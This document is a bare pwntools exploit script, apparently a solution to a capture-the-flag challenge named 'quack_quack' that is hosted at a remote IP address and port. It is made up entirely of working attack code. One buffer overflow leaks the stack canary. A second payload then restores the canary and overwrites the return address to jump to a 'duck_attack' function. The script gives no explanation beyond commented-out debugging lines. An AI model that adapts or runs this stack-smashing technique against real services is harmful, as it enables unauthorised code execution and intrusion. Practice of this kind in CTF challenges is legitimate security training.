from pwn import *
from Crypto.Util.number import *

p = remote("94.237.55.61", 49383)
# p = process("./quack_quack")
# p = gdb.debug("./quack_quack", api=True)

# p.gdb.execute("break *duckling+28")
# p.gdb.continue_and_wait()
# print("canary", p.gdb.execute("canary", to_string=True))
# print("canary", p.gdb.execute("p $rax", to_string=True))

# p.gdb.execute("break *duckling+339")
# p.gdb.continue_nowait()

line = p.recvuntil(b"> ")

payload = b"A" * 0x59
payload += b"Quack Quack "
with open("payload", "wb") as f:
    f.write(payload)
print(hex(len(payload)))
p.sendline(payload)

line = p.recvuntil(b"> ")
canary = bytes_to_long(line.lstrip(b"Quack Quack ")[:7][::-1] + b"\x00")
print(hex(canary))
print(line)

input_start = -0x68
canary_addr = -0x10
duck_attack = 0x0040137f
payload2 = b"A" * (canary_addr - input_start)
payload2 += p64(canary)
payload2 += b"A" * 8
payload2 += p64(duck_attack)
print(f"{hex(len(payload2)) = }")
print(f"{payload2 = }")
p.sendline(payload2)

# print("my replaced canary", p.gdb.execute("p $rax", to_string=True))

print(p.recvall())
